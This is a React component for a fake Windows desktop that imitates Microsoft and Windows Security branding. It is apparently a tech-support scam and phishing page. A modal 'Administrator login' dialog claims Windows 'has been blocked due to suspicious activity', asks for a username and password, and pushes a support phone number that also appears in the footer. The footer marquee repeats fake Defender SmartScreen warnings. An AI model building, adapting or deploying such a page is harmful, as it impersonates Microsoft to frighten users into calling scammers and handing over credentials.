import { useState } from 'react';
import '../../assets/css/microsoft.css';
import { FaBell, FaCog, FaQuestionCircle } from 'react-icons/fa';
import SecondContainer from "../../assets/components/second-container";
import ThirdContainer from "../../assets/components/third-container";

function Microsoft() {
    const [showLogin, setShowLogin] = useState(true);

    return (
        <div className="fake-desktop">
            <div className="left-container">
                <div className="top-right-toolbar">
                    <div className="window-buttons">
                        <button className="window-btn">−</button>
                        <button className="window-btn">□</button>
                        <button className="window-btn close-btn">×</button>
                    </div>

                    <div className="extra-buttons">
                        <button className="redeem-button">Redeem license code</button>

                        <button className="extra-btn">
                            <FaBell />
                        </button>
                        <button className="extra-btn">
                            <FaCog />
                        </button>
                        <button className="extra-btn">
                            <FaQuestionCircle />
                        </button>
                    </div>

                </div>

                <div className="sidebar-content">
                    <p>Left sidebar content</p>
                </div>
            </div>

            <SecondContainer />
            <ThirdContainer />


            <footer className="page-footer">
                <div className="footer-top">
                    <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
                    <span>Windows Security</span>
                    <span>Microsoft Support</span>
                    <span className="footer-phone">020 4549 4912</span>
                </div>
                <div className="footer-marquee">
                    <div className="marquee-content">
                        <span>
                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you. &nbsp;&nbsp;
                        </span>
                        <span>
                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you. &nbsp;&nbsp;
                        </span>
                    </div>
                </div>
            </footer>

            {showLogin && (
                <div className="login-overlay" onClick={() => setShowLogin(false)}>
                    <div className="login-dialog" onClick={e => e.stopPropagation()}>
                        <div className="dialog-title-bar">
                            <button className="close" onClick={() => setShowLogin(false)}>×</button>
                        </div>
                        <div className="dialog-body">
                            <span style={{fontSize: "28px", fontFamily: "Segoe UI"}}>Administrator login</span>
                            <p style={{marginTop: "20px"}}>
                                Windows has been blocked due to suspicious activity. 
                                Try logging in again with your Windows account and password.
                                If you need help, contact Windows Support.
                            </p>
                            <div className="phone-large">020 4549 4912</div>
                            <div className="form">
                                <input type="text" placeholder="Username" />
                                <input type="password" placeholder="Password" />
                                <button className="login-button">Login</button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default Microsoft;
